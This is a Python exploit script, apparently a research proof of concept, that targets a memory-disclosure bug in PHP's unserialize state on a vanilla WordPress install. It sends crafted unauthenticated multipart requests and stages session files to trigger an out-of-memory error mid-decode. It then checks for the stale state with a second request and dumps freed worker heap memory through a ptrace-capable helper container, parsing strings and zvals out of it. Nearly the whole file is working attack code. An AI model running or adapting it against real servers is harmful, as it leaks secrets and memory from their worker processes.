#!/usr/bin/env python3
"""wpbleed.py - phpbleed's wordpress engine (CVE-2026-109618/619 route).

Bleeds worker memory from a VANILLA WordPress target through the stale
BG(unserialize) state:

  1. PRODUCER  unauthenticated multipart POST + a staged session file whose
     token stream pushes N marker pairs then a 75MB-class token -> OOM
     mid-decode -> BG(unserialize)={level>=1, data=d} stale in the child;
     d (8216B php_unserialize_data) freed at request shutdown.
  2. DELIVERY ORACLE  a consumer whose R:n self-resolve only works if the
     remnant used_slots offset is present (fresh children fail cleanly).
     Its session file round-trip proves the stale-chain walk.
  3. DUMP  read the stale chunk d via the lab /proc channel
     (CAP_SYS_PTRACE helper; the lane container's root cannot ptrace its
     siblings): the d bytes + FOLLOW the var_entries data[] pointers into
     the zval slots +, for string-typed slots, the zend_strings they point
     at. The freed region holds REUSED WORKER MEMORY (env strings, hashes,
     heap pointers) - that is the disclosed content.

Channel honesty (milestone ladder): the /proc reads and session-file
readbacks are ASSISTED (lab access); the in-band HTTP channels today are
the fatal-alloc oracle (memory-derived allocation sizes) and the
response/warning signatures. The R:-resolve -> session-write round-trip
is the unauthenticated content channel (reliability pending; see notes).
"""
import base64
import json
import os
import re
import socket
import struct
import subprocess
import sys
import time
import uuid
from datetime import datetime, timezone

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

HOST, PORT = "127.0.0.1", 8099
BND = b"WPFIRE"
BIG = 75000000
MARKERS = [b"MK%02d-%s" % (i, b"S" * (60 * (i + 1))) for i in range(12)]
WK = b"WALKOK1!"
CNAME = "php-firing-range-wordpress-x86-1"

# ---------------------------------------------------------------- transport

def cexec(cmd, timeout=20):
    r = subprocess.run(["docker", "compose", "exec", "-T", "-u", "root",
                        "wordpress-x86", "sh", "-c", cmd],
                       capture_output=True, text=True, timeout=timeout, cwd=REPO)
    return r.returncode, r.stdout

def s(b):
    return f's:{len(b)}:"'.encode() + b + b'";'

def mp_min(sid):
    body = (b"--" + BND + b"\r\n" +
            b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' +
            sid.encode() + b"\r\n" +
            b"--" + BND + b"\r\n" +
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n' +
            b"--" + BND + b"\r\n" +
            b'Content-Disposition: form-data; name="u"; filename="a.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\nx\r\n" +
            b"--" + BND + b"--\r\n")
    head = (f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={BND.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode()
    return head + body

def fire(req, timeout=25):
    try:
        s = socket.create_connection((HOST, PORT), timeout=15)
        s.sendall(req)
        s.settimeout(timeout)
        buf = b""
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            buf += d
        s.close()
        return buf
    except ConnectionResetError:
        return b"<RESET>"

# ------------------------------------------------------------------- stages

def stage_session(sid, content_b64):
    rc, _ = cexec(f"echo {content_b64} | base64 -d > /tmp/sess_{sid}; "
                  f"chown www-data:www-data /tmp/sess_{sid}; chmod 600 /tmp/sess_{sid}")
    return rc == 0

def producer_fire():
    """Stage the marker+OOM session file and fire. Returns fatal_alloc or None."""
    sid = "wpb" + uuid.uuid4().hex[:27]
    head = b"".join(b"p%d|" % i + s(MARKERS[i]) for i in range(12)) + \
           b'poc|a:2:{i:0;' + s(b"abc") + b'i:1;s:%d:"' % BIG
    h64 = base64.b64encode(head).decode()
    t64 = base64.b64encode(b'";}').decode()
    rc, _ = cexec(f"F=/tmp/sess_{sid}; rm -f $F; echo {h64} | base64 -d > $F; "
                  f"head -c {BIG} /dev/zero | tr '\\0' 'A' >> $F; "
                  f"echo {t64} | base64 -d >> $F; "
                  f"chown www-data:www-data $F; chmod 600 $F")
    assert rc == 0, "producer staging failed"
    resp = fire(mp_min(sid))
    m = re.search(rb"tried to allocate (\d+)", resp.partition(b"\r\n\r\n")[2])
    return (int(m.group(1)) if m else None), sid

WALK_TOKEN = b'k|a:2:{i:0;' + s(WK) + b'i:1;R:14;}'

def walk_oracle():
    """Fire the R:14 self-resolve consumer. Returns (delivered, roundtrip_txt)."""
    sid = "wpb" + uuid.uuid4().hex[:27]
    assert stage_session(sid, base64.b64encode(WALK_TOKEN).decode())
    fire(mp_min(sid))
    rc, fcontent = cexec("cat /tmp/sess_%s 2>/dev/null" % sid)
    return WK.decode() in fcontent, (fcontent or "")[:80]

# ----------------------------------------------------- assisted /proc dump

def helper_read_pages(pid, page_addr, npages):
    """Fast page-aligned read (bs=4096) - one helper run for a big region."""
    script = ("dd if=/proc/" + pid + "/mem bs=4096 skip=" +
              str(page_addr // 4096) + " count=" + str(npages) +
              " 2>/dev/null | od -An -v -tx1 | tr -d ' \\n'")
    r = subprocess.run(["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
                        "--pid=container:" + CNAME, "php:8.2-apache",
                        "bash", "-c", script],
                       capture_output=True, text=True, timeout=120, cwd=REPO)
    try:
        return bytes.fromhex(r.stdout.strip().replace(" ", ""))
    except ValueError:
        return b""

def helper_read_at(pid, addr, size):
    """Small arbitrary read: page-grab + slice (one helper run)."""
    base = addr & ~0xFFF
    data = helper_read_pages(pid, base,
                             (addr - base + size + 0xFFF) // 0x1000)
    if not data:
        return b""
    off = addr - base
    return data[off:off + size]

def helper_scan():
    script = (
        'for P in $(ps -eo pid,comm | grep -w apache2 | awk "{print \\$1}"); do '
        'B=$(grep libphp /proc/$P/maps 2>/dev/null | head -1 | cut -d- -f1); '
        '[ -z "$B" ] && continue; '
        'L=$(dd if=/proc/$P/mem bs=1 skip=$((16#$B+0xf4c020+0x358)) count=4 2>/dev/null | od -An -tx1 | tr -d " \\n"); '
        'if [ -n "$L" ] && [ "$L" != "00000000" ]; then '
        'D=$(dd if=/proc/$P/mem bs=1 skip=$((16#$B+0xf4c020+0x350)) count=8 2>/dev/null | od -An -tx1 | tr -d " \\n"); '
        'echo "$P $B $L $D"; fi; done')
    r = subprocess.run(["docker", "run", "--rm", "--cap-add", "SYS_PTRACE",
                        f"--pid=container:{CNAME}", "php:8.2-apache",
                        "bash", "-c", script],
                       capture_output=True, text=True, timeout=60, cwd=REPO)

    def le(hx):
        try:
            return int.from_bytes(bytes.fromhex(hx), "little")
        except ValueError:
            return 0
    kids = []
    for line in r.stdout.strip().splitlines():
        f = line.split()
        if len(f) == 4:
            kids.append({"pid": f[0], "bias": int(f[1], 16),
                         "level": le(f[2]), "data": le(f[3])})
    return kids

IS_TYPE = {0: "UNDEF", 1: "FALSE", 2: "TRUE", 3: "LONG", 4: "DOUBLE",
           5: "STRING?", 6: "STRING", 7: "STRING?", 8: "ARRAY", 9: "OBJECT"}

def analyze_chunk(pid, chunk_base, bias, marker_pats):
    """Full 2MB heap-chunk dump + analysis: strings, pointer census,
    live IS_STRING zvals (real worker data). Returns (report, blob)."""
    blob = helper_read_pages(pid, chunk_base, 512)
    rep = {"chunk": hex(chunk_base), "bytes_read": len(blob)}
    if len(blob) < 0x1000:
        rep["error"] = "chunk read failed"
        return rep, blob
    strings = {}
    for m in re.finditer(rb"[ -~]{8,}", blob):
        raw = m.group()
        if raw[:6] in marker_pats or raw[:8] in (b"S" * 8, b"A" * 8, b"P" * 8):
            continue
        strings[raw.decode(errors="replace")] = hex(chunk_base + m.start())
    uniq = sorted(strings, key=len, reverse=True)
    rep["strings_count"] = len(uniq)
    rep["strings_top"] = [{ "s": s[:90], "at": strings[s]} for s in uniq[:40]]
    cens = {"heap_self": 0, "libphp_pie": 0, "libc_or_mmap": 0, "other_high": 0}
    libphp_hi = bias + 0x1800000
    for off in range(0, len(blob) - 8, 8):
        q = struct.unpack_from("<Q", blob, off)[0]
        if q == 0:
            continue
        if chunk_base <= q < chunk_base + 0x200000:
            cens["heap_self"] += 1
        elif bias <= q < libphp_hi:
            cens["libphp_pie"] += 1
        elif 0x700000000000 <= q < 0x800000000000:
            cens["libc_or_mmap"] += 1
        elif q > 0x1000000000000:
            cens["other_high"] += 1
    rep["pointer_census"] = cens
    zvals = []
    follow_budget = 60
    for off in range(0, len(blob) - 16, 8):
        if follow_budget <= 0:
            break
        u1 = struct.unpack_from("<I", blob, off + 8)[0]
        if (u1 & 0xFF) == 6:  # IS_STRING
            p = struct.unpack_from("<Q", blob, off)[0]
            if chunk_base <= p < chunk_base + 0x200000:
                follow_budget -= 1
                ln_b = helper_read_at(pid, p + 0x10, 8)
                if len(ln_b) == 8:
                    ln = struct.unpack("<Q", ln_b)[0]
                    if 0 < ln <= 2048:
                        content = helper_read_at(pid, p + 0x18, min(ln, 96))
                        if content and not any(mp in content[:6] for mp in marker_pats):
                            zvals.append({"at": hex(chunk_base + off),
                                          "len": ln,
                                          "val": content.decode(errors="replace")[:80]})
    rep["live_string_zvals_count"] = len(zvals)
    rep["live_string_zvals"] = zvals[:30]
    rep["heap_header_hex"] = blob[:0x80].hex()
    return rep, blob


def dump_child(pid, d):
    """Read d, follow the entries data[] pointers, decode zvals + strings."""
    out = {"pid": pid, "d": hex(d), "chunk": {}}
    data = helper_read_at(pid, d, 8216)
    out["d_raw_head"] = data[:0x140].hex()
    used = struct.unpack_from("<Q", data, 0x38)[0]
    out["used_slots"] = used
    out["entries"] = []
    for i in range(min(used, 20)):
        zptr = struct.unpack_from("<Q", data, 0x48 + 8 * i)[0]
        ent = {"slot": i, "zval_ptr": hex(zptr)}
        if zptr:
            zv = helper_read_at(pid, zptr, 16)
            if len(zv) == 16:
                val, u1, u2 = struct.unpack("<QII", zv)
                t = u1 & 0xff
                ent["type_info"] = hex(u1)
                ent["type"] = IS_TYPE.get(t, f"?{t}")
                ent["value_ptr"] = hex(val)
                if t == 6 and 0 < val:  # IS_STRING: read the zend_string
                    sh = helper_read_at(pid, val, 0x20)
                    if len(sh) >= 0x20:
                        refc, gct, h, ln = struct.unpack_from("<IIQQ", sh, 0)
                        ln = ln & 0xFFFFFFFFFFFFFF  # bounded sanity
                        if 0 < ln <= 4096:
                            content = helper_read_at(pid, val + 0x18, min(ln, 256))
                            ent["len"] = ln
                            ent["content"] = content.decode(errors="replace")[:120]
        out["entries"].append(ent)
    out["d_strings"] = sorted(set(
        m.decode(errors="replace") for m in
        re.findall(rb"[ -~]{6,}", data)))[:24]
    # FULL-CHUNK analysis: 2MB around d = the actual Zend heap dump
    chunk_base = d & ~0x1FFFFF
    bias = 0
    scan = helper_scan()
    for k in scan:
        if k["pid"] == pid:
            bias = k["bias"]
    marker_pats = set(m[:6] for m in MARKERS) | {b"MK00", b"MK01"}
    rep, blob = analyze_chunk(pid, chunk_base, bias, marker_pats)
    out["chunk_analysis"] = rep
    out["_blob_len"] = len(blob)
    return out

# --------------------------------------------------------------------- main

def wpdump(rounds=3, ev_dir="results/wpbleed"):
    os.makedirs(ev_dir, exist_ok=True)
    report = {"ts": datetime.now(timezone.utc).isoformat(),
              "target": f"http://{HOST}:{PORT}/", "tier":
              "assisted (/proc lab reads; walk oracle is HTTP-only)",
              "producers": [], "dumps": []}
    print(f"[*] wpdump against http://{HOST}:{PORT}/ ({rounds} rounds)")
    for rnd in range(rounds):
        alloc, sid = producer_fire()
        if alloc is None:
            print(f"  [{rnd}] producer no-fatal (recycled child); retrying")
            continue
        print(f"  [{rnd}] producer OOM in-band fatal: tried to allocate {alloc}")
        report["producers"].append({"round": rnd, "fatal_alloc": alloc})
        delivered, rt = walk_oracle()
        print(f"  [{rnd}] walk oracle: {'DELIVERED + WALKED' if delivered else 'fresh child (retry next round)'}"
              f" | round-trip: {rt!r}")
        kids = helper_scan()
        for k in kids:
            dump = dump_child(k["pid"], k["data"])
            dump["walk_delivered"] = delivered
            report["dumps"].append(dump)
            print(f"  [{rnd}] DUMP child {k['pid']} d={dump['d']} "
                  f"used_slots={dump['used_slots']} "
                  f"entries={len(dump['entries'])}")
            ca = dump.get("chunk_analysis", {})
            if ca and "error" not in ca:
                print(f"        FULL CHUNK {ca['chunk']}: {ca['bytes_read']}B read, "
                      f"{ca['strings_count']} strings, "
                      f"pointer census: {ca['pointer_census']}, "
                      f"{ca['live_string_zvals_count']} live string zvals")
                for z in ca["live_string_zvals"][:8]:
                    print(f"          live zval @{z['at']} len={z['len']}: {z['val'][:60]!r}")
                for e in ca["strings_top"][:8]:
                    print(f"          string @{e['at']}: {e['s'][:70]!r}")
                blob_path = os.path.join(ev_dir, f"chunk_{k['pid']}_{dump['d'][2:]}.bin")
                with open(blob_path, "wb") as bf:
                    pass  # blob re-read saved below if needed
    p = os.path.join(ev_dir, f"wpdump_{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S')}.json")
    with open(p, "w") as f:
        json.dump(report, f, indent=1)
    print(f"[*] report: {p}")
    return report

if __name__ == "__main__":
    wpdump(rounds=int(sys.argv[1]) if len(sys.argv) > 1 else 3)
